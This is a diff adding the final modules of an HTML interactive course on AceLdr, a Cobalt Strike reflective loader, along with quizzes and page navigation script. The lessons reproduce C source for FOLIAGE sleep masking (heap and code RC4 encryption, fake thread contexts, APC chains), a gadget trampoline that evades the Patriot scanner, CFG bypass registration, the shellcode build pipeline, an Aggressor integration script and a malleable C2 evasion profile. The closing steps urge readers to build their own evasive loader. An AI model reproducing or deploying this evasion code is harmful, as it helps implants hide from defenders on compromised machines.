+<div class="quiz-result" id="quiz6-result"></div>
+</div>
+
+<div class="nav-btns">
+<button onclick="goTo(5)">&larr; Previous</button>
+<button class="primary" onclick="goTo(7)">Next: FOLIAGE Sleep Masking &rarr;</button>
+</div>
+</div>
+
+<!-- ============== MODULE 7 ============== -->
+<div class="module" id="mod7">
+<span class="diff-badge hard">Difficulty: Advanced</span>
+<h1>Module 8: FOLIAGE Sleep Masking</h1>
+<p class="subtitle">The crown jewel: encrypting yourself while you sleep.</p>
+
+<div class="card highlight">
+<h4>The Big Idea</h4>
+<p>Cobalt Strike Beacon spends ~95% of its time sleeping between C2 check-ins. During sleep, memory scanners have plenty of time to find it. FOLIAGE (inspired by the <a href="https://github.com/SecIdiot/FOLIAGE" style="color:var(--accent)">SecIdiot/FOLIAGE</a> project) makes Beacon <strong>invisible during sleep</strong> by: (1) marking code as non-executable, (2) encrypting all code and heap data, (3) spoofing the thread's context, and (4) using APC chains to orchestrate the whole thing from a separate thread.</p>
+</div>
+
+<h2>The Sleep_Hook Entry Point</h2>
+<pre><code><span class="lang-tag">C - from hooks/delay.c</span>VOID Sleep_Hook( DWORD dwMilliseconds )
+{
+    API Api;
+    RtlSecureZeroMemory( &amp;Api, sizeof(Api) );
+
+    // Get our allocation's base and size from the STUB structure
+    Api.Buffer = (PVOID)((PSTUB)OFFSET(Stub))->Region;
+    Api.Length = (ULONG)((PSTUB)OFFSET(Stub))->Size;
+
+    if( resolveSleepHookFunctions( &amp;Api ) == STATUS_SUCCESS )
+    {
+        if( dwMilliseconds &lt; 1000 ) {
+            // Short sleep: don't bother with the full chain
+            Api.k32.WaitForSingleObjectEx( (HANDLE)-1, dwMilliseconds, FALSE );
+            return;
+        }
+
+        generateEncryptionKey( &amp;Api );  // Random 16-byte RC4 key
+        encryptHeap( &amp;Api );            // Encrypt all heap data
+        delayExec( &amp;Api );              // The FOLIAGE APC chain
+        encryptHeap( &amp;Api );            // Decrypt heap data (RC4 is symmetric)
+    }
+    RtlSecureZeroMemory( &amp;Api, sizeof(Api) );
+}</code></pre>
+
+<h2>Heap Encryption</h2>
+<pre><code><span class="lang-tag">C - from hooks/delay.c</span>VOID encryptHeap( PAPI pApi )
+{
+    RTL_HEAP_WALK_ENTRY Entry = { 0 };
+    USTRING S32Key = { KEY_SIZE, KEY_SIZE, pApi->enckey };
+
+    // Walk every allocation in our private heap
+    while( NT_SUCCESS( pApi->ntdll.RtlWalkHeap( GetProcessHeap_Hook(), &amp;Entry ) ) )
+    {
+        if( ( Entry.Flags &amp; RTL_PROCESS_HEAP_ENTRY_BUSY ) != 0 )
+        {
+            // Encrypt this heap block with RC4 (SystemFunction032)
+            USTRING S32Data = { Entry.DataSize, Entry.DataSize, Entry.DataAddress };
+            pApi->advapi.SystemFunction032( &amp;S32Data, &amp;S32Key );
+        }
+    }
+}</code></pre>
+
+<h2>The APC Chain: 10 Steps of Orchestration</h2>
+<p>The sleep chain creates a <strong>separate thread</strong> and queues <strong>10 APC (Asynchronous Procedure Call)</strong> entries. When the thread is alerted, it executes them in order via <code>NtContinue</code>:</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">FOLIAGE APC Chain (10 Steps)</h4>
+<div class="flow" style="flex-direction:column;gap:3px;max-width:650px;margin:0 auto;font-size:.82rem">
+<div class="box r" style="width:100%"><strong>APC 9:</strong> NtWaitForSingleObject(event) - Wait for sync signal</div>
+<div class="box y" style="width:100%"><strong>APC 8:</strong> NtProtectVirtualMemory &rarr; PAGE_READWRITE (make code writable, non-executable)</div>
+<div class="box y" style="width:100%"><strong>APC 7:</strong> SystemFunction032 - RC4 encrypt all code</div>
+<div class="box" style="width:100%"><strong>APC 6:</strong> NtGetContextThread(originalThread) - Save real context</div>
+<div class="box" style="width:100%"><strong>APC 5:</strong> NtSetContextThread(originalThread, fakeCtx) - Set fake context</div>
+<div class="box hl" style="width:100%"><strong>APC 4:</strong> WaitForSingleObjectEx(originalThread, sleepTime) - THE ACTUAL SLEEP</div>
+<div class="box y" style="width:100%"><strong>APC 3:</strong> SystemFunction032 - RC4 decrypt all code (same key = decrypt)</div>
+<div class="box" style="width:100%"><strong>APC 2:</strong> NtSetContextThread(originalThread, realCtx) - Restore real context</div>
+<div class="box y" style="width:100%"><strong>APC 1:</strong> NtProtectVirtualMemory &rarr; PAGE_EXECUTE_READWRITE (make code executable again)</div>
+<div class="box g" style="width:100%"><strong>APC 0:</strong> RtlExitUserThread - Clean exit of sleep thread</div>
+</div>
+</div>
+
+<div class="card warn">
+<h4>Why APC Instead of Direct Calls?</h4>
+<p>If Sleep_Hook did all this directly, it would be on Beacon's thread - and the call stack would reveal AceLdr's code. By offloading to APCs on a <strong>separate thread</strong>, the encryption/protection changes happen from an "innocent" thread context. The original Beacon thread gets its context replaced with a fake one pointing at a benign location (<code>RtlUserThreadStart + 0x21</code>).</p>
+</div>
+
+<h2>The Patriot Evasion: JMP RBX Trampoline</h2>
+<p>Notice APCs 8 and 1 use the <code>Trampoline</code> (JMP [RBX] gadget) instead of calling <code>NtProtectVirtualMemory</code> directly. This is specifically to evade <strong>Patriot</strong>, which walks APC call stacks:</p>
+
+<pre><code><span class="lang-tag">C - APCs 8 and 1 use indirect call via gadget</span>// APC 8: Change protection to RW (via trampoline to evade Patriot)
+Contexts[8]->Rip = (ULONG_PTR) Trampoline;       // JMP [RBX] gadget
+Contexts[8]->Rbx = (ULONG_PTR) &amp;pApi->ntdll.NtProtectVirtualMemory; // Target
+Contexts[8]->Rcx = (ULONG_PTR) (HANDLE)-1;       // Current process
+Contexts[8]->Rdx = (ULONG_PTR) &amp;pApi->Buffer;    // Base address
+Contexts[8]->R8  = (ULONG_PTR) &amp;pApi->Length;     // Region size
+Contexts[8]->R9  = (ULONG_PTR) PAGE_READWRITE;    // New protection</code></pre>
+
+<h2>CFG (Control Flow Guard) Handling</h2>
+<p>Windows CFG validates indirect call targets. Since APC execution uses indirect calls to functions like <code>NtContinue</code> and <code>WaitForSingleObjectEx</code>, AceLdr must register them as valid targets:</p>
+
+<pre><code><span class="lang-tag">C - from hooks/delay.c</span>VOID handleCFG( PAPI pApi )
+{
+    setValidCallTargets( pApi, pApi->hK32,    pApi->k32.WaitForSingleObjectEx );
+    setValidCallTargets( pApi, pApi->hNtdll,  pApi->ntdll.NtContinue );
+    setValidCallTargets( pApi, pApi->hNtdll,  pApi->ntdll.NtGetContextThread );
+    setValidCallTargets( pApi, pApi->hNtdll,  pApi->ntdll.NtProtectVirtualMemory );
+    setValidCallTargets( pApi, pApi->hNtdll,  pApi->ntdll.NtSetContextThread );
+    setValidCallTargets( pApi, pApi->hNtdll,  pApi->ntdll.NtTestAlert );
+    setValidCallTargets( pApi, pApi->hNtdll,  pApi->ntdll.NtWaitForSingleObject );
+    setValidCallTargets( pApi, pApi->hNtdll,  pApi->ntdll.RtlExitUserThread );
+}</code></pre>
+
+<h2>RC4 via SystemFunction032</h2>
+<p>AceLdr uses the undocumented <code>SystemFunction032</code> from <code>advapi32.dll</code> - it's a native Windows RC4 implementation. Since RC4 is symmetric (encrypt and decrypt use the same operation), calling it twice with the same key restores the original data.</p>
+
+<pre><code><span class="lang-tag">C - Key generation</span>#define KEY_SIZE 16
+#define KEY_VALS "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"
+
+VOID generateEncryptionKey( PAPI pApi )
+{
+    ULONG Seed = 1337;
+    for( int i = 0; i &lt; KEY_SIZE; i++ ) {
+        Seed = pApi->ntdll.RtlRandomEx( &amp;Seed );
+        pApi->enckey[i] = KEY_VALS[ Seed % 61 ];  // Random alphanumeric char
+    }
+}</code></pre>
+
+<div class="quiz" id="quiz7">
+<h4>Pop Quiz: FOLIAGE</h4>
+<div class="quiz-q" data-correct="1">
+<p>Q1: Why is the heap encrypted BEFORE entering the APC chain?</p>
+<label data-opt="0"><input type="radio" name="q7_0"> Because APCs can't access heap memory</label>
+<label data-opt="1"><input type="radio" name="q7_0"> Because the APC chain encrypts code but can't walk the heap (it needs callable code for RtlWalkHeap)</label>
+<label data-opt="2"><input type="radio" name="q7_0"> For performance reasons</label>
+<label data-opt="3"><input type="radio" name="q7_0"> Heap encryption is optional</label>
+<div class="explain">The APC chain changes code permissions to RW and encrypts it. After that point, the code is non-executable. RtlWalkHeap requires executable code to run, so heap encryption must happen before the code gets encrypted. After waking up, the APC chain decrypts code first, then the Sleep_Hook function decrypts the heap.</div>
+</div>
+<div class="quiz-q" data-correct="3">
+<p>Q2: How does SystemFunction032 (RC4) handle decryption?</p>
+<label data-opt="0"><input type="radio" name="q7_1"> You need a separate decryption key</label>
+<label data-opt="1"><input type="radio" name="q7_1"> You call SystemFunction033 for decryption</label>
+<label data-opt="2"><input type="radio" name="q7_1"> You pass a "decrypt" flag</label>
+<label data-opt="3"><input type="radio" name="q7_1"> You call it again with the same key - RC4 is symmetric</label>
+<div class="explain">RC4 is a stream cipher where the same operation both encrypts and decrypts. XOR(XOR(data, keystream), keystream) = data. AceLdr calls encryptHeap() before sleep (encrypts) and after sleep (decrypts) with the same key.</div>
+</div>
+<div class="quiz-q" data-correct="2">
+<p>Q3: What happens to the original Beacon thread during sleep?</p>
+<label data-opt="0"><input type="radio" name="q7_2"> It's terminated and recreated</label>
+<label data-opt="1"><input type="radio" name="q7_2"> It continues running normally</label>
+<label data-opt="2"><input type="radio" name="q7_2"> Its context is replaced with a fake one pointing to an innocent location</label>
+<label data-opt="3"><input type="radio" name="q7_2"> It's moved to a different process</label>
+<div class="explain">APC 6 saves the real thread context. APC 5 replaces it with a fake context where RIP points to RtlUserThreadStart + 0x21 (an innocent return instruction). Anyone inspecting the thread during sleep sees it "at" a benign location in ntdll. After waking, APC 2 restores the real context.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz7')">Check Answers</button>
+<div class="quiz-result" id="quiz7-result"></div>
+</div>
+
+<div class="nav-btns">
+<button onclick="goTo(6)">&larr; Previous</button>
+<button class="primary" onclick="goTo(8)">Next: Full Chain &amp; Integration &rarr;</button>
+</div>
+</div>
+
+<!-- ============== MODULE 8 ============== -->
+<div class="module" id="mod8">
+<span class="diff-badge hard">Difficulty: Advanced</span>
+<h1>Module 9: Full Chain &amp; Cobalt Strike Integration</h1>
+<p class="subtitle">Putting it all together: from shellcode injection to invisible Beacon.</p>
+
+<div class="card highlight">
+<h4>The Complete Picture</h4>
+<p>You've learned each piece individually. Now let's see how everything fits together - from the Makefile that builds the shellcode, to the Aggressor script that integrates it with Cobalt Strike, to the malleable C2 profile that configures network evasion.</p>
+</div>
+
+<h2>The Build Pipeline</h2>
+<pre><code><span class="lang-tag">Makefile</span># Step 1: Assemble the ASM files (entry point, gadget spoof, utilities)
+nasm -f win64 src/asm/start.asm -o bin/start.tmp.o
+nasm -f win64 src/asm/misc.asm  -o bin/misc.tmp.o
+nasm -f win64 src/asm/spoof.asm -o bin/spoof.tmp.o
+
+# Step 2: Compile everything with position-independent flags
+x86_64-w64-mingw32-gcc src/*.c bin/*.tmp.o src/hooks/*.c \
+    -o bin/AceLdr.x64.exe \
+    -Os -nostdlib -fno-asynchronous-unwind-tables \
+    -fPIC -s -ffunction-sections \
+    -Wl,-s,--no-seh,--image-base=0,-Tsrc/link.ld
+
+# Step 3: Extract shellcode from the PE's first section
+python3 scripts/extract.py -f bin/AceLdr.x64.exe -o bin/AceLdr.x64.bin</code></pre>
+
+<div class="card">
+<h4>Key Compiler Flags Explained</h4>
+<table>
+<tr><th>Flag</th><th>Why It Matters</th></tr>
+<tr><td><code>-nostdlib</code></td><td>No C runtime - shellcode can't depend on libc being initialized</td></tr>
+<tr><td><code>-fPIC</code></td><td>Position-independent code - mandatory for shellcode</td></tr>
+<tr><td><code>-Os</code></td><td>Optimize for size - smaller shellcode = less suspicious</td></tr>
+<tr><td><code>-ffunction-sections</code></td><td>Each function in its own section - enables the linker script ordering</td></tr>
+<tr><td><code>--no-seh</code></td><td>No structured exception handling tables - reduces PE artifacts</td></tr>
+<tr><td><code>--image-base=0</code></td><td>Base address 0 - combined with link.ld for correct PIC</td></tr>
+<tr><td><code>-s</code></td><td>Strip all symbols - no debug info in output</td></tr>
+</table>
+</div>
+
+<h2>Cobalt Strike Integration</h2>
+<pre><code><span class="lang-tag">Aggressor Script - bin/AceLdr.cna</span>set BEACON_RDLL_GENERATE {
+    # Build path to the correct architecture binary
+    $smpath = script_resource( "AceLdr.". $3 .".bin" );
+
+    # Read the entire binary
+    $hnd = openf( $smpath );
+    $ldr = readb( $hnd, -1 );
+    closef( $hnd );
+
+    if ( strlen( $ldr ) == 0 ) { return $null; }
+
+    warn("Loading custom UDRL from: " . $smpath);
+
+    # $ldr = our loader, $2 = beacon DLL, $3 = arch
+    # Concatenate: [AceLdr shellcode][Beacon PE]
+    return setup_transformations($ldr . $2, $3);
+};</code></pre>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Complete AceLdr Lifecycle</h4>
+<div class="flow" style="flex-direction:column;gap:3px;max-width:700px;margin:0 auto;font-size:.82rem">
+<div class="box hl" style="width:100%;font-weight:700">PHASE 1: INJECTION</div>
+<div class="box" style="width:100%">Cobalt Strike generates shellcode: [AceLdr | Beacon PE]</div>
+<div class="box" style="width:100%">Operator injects shellcode into target process</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box hl" style="width:100%;font-weight:700">PHASE 2: REFLECTIVE LOAD</div>
+<div class="box" style="width:100%">Start() &rarr; Ace() creates suspended thread &rarr; hijacks RIP to Loader()</div>
+<div class="box" style="width:100%">Loader() allocates RW memory, copies stub + beacon sections</div>
+<div class="box" style="width:100%">Creates private heap, installs 6 IAT hooks, applies relocations</div>
+<div class="box" style="width:100%">Changes memory to RX, calls Beacon DllMain</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box hl" style="width:100%;font-weight:700">PHASE 3: RUNNING (C2 check-in)</div>
+<div class="box" style="width:100%">Beacon's network calls go through InternetConnectA_Hook (return addr spoofed)</div>
+<div class="box" style="width:100%">All heap allocations redirected to private heap via GetProcessHeap_Hook</div>
+<div class="box" style="width:100%">Wait operations spoofed via NtWaitForSingleObject_Hook</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box hl" style="width:100%;font-weight:700">PHASE 4: SLEEPING (95% of the time)</div>
+<div class="box y" style="width:100%">Sleep_Hook: generate key &rarr; encrypt heap &rarr; delayExec()</div>
+<div class="box y" style="width:100%">APC Chain: mark code RW &rarr; encrypt code &rarr; save context &rarr; set fake context</div>
+<div class="box g" style="width:100%">SLEEP: code encrypted + non-executable, heap encrypted, thread context faked</div>
+<div class="box y" style="width:100%">WAKE: decrypt code &rarr; restore context &rarr; mark code RX &rarr; decrypt heap</div>
+<div style="text-align:center;color:var(--dim)">&darr; repeats &darr;</div>
+</div>
+</div>
+
+<h2>Malleable C2 Profile Highlights</h2>
+<p>The <code>example.profile</code> complements AceLdr with network-level evasion:</p>
+<pre><code><span class="lang-tag">Cobalt Strike Profile - example.profile (key settings)</span>set sleeptime "5000";        # 5 second sleep between check-ins
+set jitter    "50";          # 50% sleep jitter (2.5-7.5 seconds)
+set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...";
+
+stage {
+    set sleep_mask "true";   # Enable sleep masking (our hooks!)
+    set smartinject "true";  # Smart injection techniques
+    set obfuscate   "true";  # Obfuscate Beacon in memory
+    set stomppe     "true";  # Stomp the PE header after load
+    set allocator   "VirtualAlloc"; # Memory allocation method
+}
+
+process-inject {
+    set allocator   "NtMapViewOfSection";
+    set userwx      "false";  # Never use RWX permissions
+    set startrwx    "false";  # Don't start with RWX
+}</code></pre>
+
+<h2>References &amp; Further Reading</h2>
+<div class="card">
+<h4>Primary Sources</h4>
+<ul>
+<li><strong>AceLdr Repository</strong> - <code>github.com/kyleavery/AceLdr</code></li>
+<li><strong>FOLIAGE (SecIdiot)</strong> - The original sleep obfuscation technique: <code>github.com/SecIdiot/FOLIAGE</code></li>
+<li><strong>TitanLdr (SecIdiot)</strong> - Reflective loader that inspired AceLdr's PE loading: <code>github.com/SecIdiot/TitanLdr</code></li>
+<li><strong>Return Address Spoofing</strong> - x64 spoofing technique: <code>unknowncheats.me/forum/anti-cheat-bypass/268039</code></li>
+</ul>
+<h4 style="margin-top:15px">Detection Tools</h4>
+<ul>
+<li><strong>Moneta</strong> - <code>github.com/forrest-orr/moneta</code></li>
+<li><strong>PE-sieve</strong> - <code>github.com/hasherezade/pe-sieve</code></li>
+<li><strong>BeaconEye</strong> - <code>github.com/CCob/BeaconEye</code></li>
+<li><strong>Hunt-Sleeping-Beacons</strong> - <code>github.com/thefLink/Hunt-Sleeping-Beacons</code></li>
+<li><strong>Patriot</strong> - <code>github.com/joe-desimone/patriot</code></li>
+</ul>
+<h4 style="margin-top:15px">Concepts to Study Further</h4>
+<ul>
+<li>Windows Internals (Russinovich) - Chapters on Memory Management and Processes/Threads</li>
+<li>Cobalt Strike UDRL documentation (Raphael Mudge's blog)</li>
+<li>PE Format specification (Microsoft docs)</li>
+<li>APC internals and thread alertability</li>
+<li>Control Flow Guard (CFG) internals</li>
+</ul>
+</div>
+
+<div class="quiz" id="quiz8">
+<h4>Final Exam: Full Chain</h4>
+<div class="quiz-q" data-correct="1">
+<p>Q1: In the build process, what does extract.py use as the shellcode end marker?</p>
+<label data-opt="0"><input type="radio" name="q8_0"> A null byte sequence</label>
+<label data-opt="1"><input type="radio" name="q8_0"> The ASCII string "ACELDR"</label>
+<label data-opt="2"><input type="radio" name="q8_0"> The PE checksum</label>
+<label data-opt="3"><input type="radio" name="q8_0"> The .reloc section</label>
+<div class="explain">The Leave label in misc.asm contains db 'A','C','E','L','D','R'. The extraction script finds this marker in the first PE section and takes everything before it as the final shellcode binary.</div>
+</div>
+<div class="quiz-q" data-correct="2">
+<p>Q2: The CNA script does <code>$ldr . $2</code>. What does this produce?</p>
+<label data-opt="0"><input type="radio" name="q8_1"> Two separate files</label>
+<label data-opt="1"><input type="radio" name="q8_1"> An encrypted Beacon DLL</label>
+<label data-opt="2"><input type="radio" name="q8_1"> A single blob: [AceLdr shellcode][Beacon PE] concatenated together</label>
+<label data-opt="3"><input type="radio" name="q8_1"> A packed executable</label>
+<div class="explain">The dot operator in Aggressor concatenates strings/bytes. $ldr is the AceLdr shellcode, $2 is the raw Beacon DLL. The result is a single shellcode blob where AceLdr comes first and Beacon follows immediately after. AceLdr uses G_END() to find where its code ends and Beacon begins.</div>
+</div>
+<div class="quiz-q" data-correct="0">
+<p>Q3: During Beacon's sleep, which of these is NOT true?</p>
+<label data-opt="0"><input type="radio" name="q8_2"> The original Beacon thread is terminated</label>
+<label data-opt="1"><input type="radio" name="q8_2"> All code memory is encrypted with RC4</label>
+<label data-opt="2"><input type="radio" name="q8_2"> The code memory is marked as non-executable (RW)</label>
+<label data-opt="3"><input type="radio" name="q8_2"> The heap is encrypted with RC4</label>
+<div class="explain">The thread is NOT terminated - it's still alive but its context is replaced with a fake one. Terminating and recreating threads would be much more suspicious and would lose the Beacon's execution state. Everything else listed (encrypted code, RW permissions, encrypted heap) is true.</div>
+</div>
+<div class="quiz-q" data-correct="3">
+<p>Q4: Put the sleep chain in order: (A) Encrypt code, (B) Encrypt heap, (C) Mark code RW, (D) Generate key</p>
+<label data-opt="0"><input type="radio" name="q8_3"> A, B, C, D</label>
+<label data-opt="1"><input type="radio" name="q8_3"> C, A, B, D</label>
+<label data-opt="2"><input type="radio" name="q8_3"> D, C, A, B</label>
+<label data-opt="3"><input type="radio" name="q8_3"> D, B, C, A</label>
+<div class="explain">D first (need a key before encrypting anything), B second (encrypt heap while code is still executable to run RtlWalkHeap), C third (mark code as RW via APC), A last (encrypt the now-writable code via APC). The order matters because heap encryption requires running code, and code encryption requires writable permissions.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz8')">Check Answers</button>
+<div class="quiz-result" id="quiz8-result"></div>
+</div>
+
+<div class="card green" style="margin-top:30px">
+<h4>Course Complete!</h4>
+<p>You now understand how AceLdr works from the ground up. To solidify your knowledge:</p>
+<ol>
+<li><strong>Clone the repo</strong> and read through the code with this course as a guide</li>
+<li><strong>Modify a technique</strong> - try changing the hash algorithm or adding a new hook</li>
+<li><strong>Study the detection tools</strong> - understand what they look for and why AceLdr's techniques defeat them</li>
+<li><strong>Build your own loader</strong> - start simple (PEB walking + PE loading) and add evasion incrementally</li>
+</ol>
+</div>
+
+<div class="nav-btns">
+<button onclick="goTo(7)">&larr; Previous</button>
+<button class="primary" onclick="goTo(0)">Back to Start</button>
+</div>
+</div>
+</main>
+
+<script>
+const modules = document.querySelectorAll('.module');
+const navLinks = document.querySelectorAll('nav a[data-mod]');
+const totalMods = modules.length;
+let visited = new Set([0]);
+
+function goTo(n) {
+    modules.forEach(m => m.classList.remove('active'));
+    navLinks.forEach(a => a.classList.remove('active'));
+    document.getElementById('mod' + n).classList.add('active');
+    navLinks[n].classList.add('active');
+    visited.add(n);
+    updateProgress();
+    window.scrollTo({top: 0, behavior: 'smooth'});
+    document.querySelector('nav').classList.remove('open');
+}
+
+navLinks.forEach(a => {
+    a.addEventListener('click', e => {
+        e.preventDefault();
+        goTo(parseInt(a.dataset.mod));
+    });
+});
+
+function updateProgress() {
+    const pct = Math.round((visited.size / totalMods) * 100);
+    document.getElementById('progressFill').style.width = pct + '%';
+    document.getElementById('progressText').textContent = visited.size + ' / ' + totalMods + ' modules';
+}
+
+function gradeQuiz(quizId) {
+    const quiz = document.getElementById(quizId);
+    const questions = quiz.querySelectorAll('.quiz-q');
+    let correct = 0;
+    let total = questions.length;
+
+    questions.forEach((q, qi) => {
+        const correctIdx = parseInt(q.dataset.correct);
+        const labels = q.querySelectorAll('label');
+        const selected = q.querySelector('input:checked');
+
+        labels.forEach(l => { l.classList.remove('correct', 'wrong'); });
+
+        if (selected) {
+            const selectedIdx = parseInt(selected.closest('label').dataset.opt);
+            if (selectedIdx === correctIdx) {
+                selected.closest('label').classList.add('correct');
+                correct++;
+            } else {
+                selected.closest('label').classList.add('wrong');
+                labels[correctIdx].classList.add('correct');
+            }
+        } else {
+            labels[correctIdx].classList.add('correct');
+        }
+        q.querySelector('.explain').style.display = 'block';
+    });
+
+    const result = quiz.querySelector('.quiz-result');
+    result.style.display = 'block';
+    const pct = Math.round((correct / total) * 100);
+    if (pct >= 80) {
+        result.style.background = '#10b98120';
+        result.style.color = '#10b981';
+        result.textContent = `${correct}/${total} (${pct}%) - Great job! You've got this.`;
+    } else if (pct >= 50) {
+        result.style.background = '#f59e0b20';
+        result.style.color = '#f59e0b';
+        result.textContent = `${correct}/${total} (${pct}%) - Good effort! Review the explanations above.`;
+    } else {
+        result.style.background = '#ef444420';
+        result.style.color = '#ef4444';
+        result.textContent = `${correct}/${total} (${pct}%) - Re-read this module and try again!`;
+    }
+}
+
+updateProgress();
+</script>
+</body>
+</html>
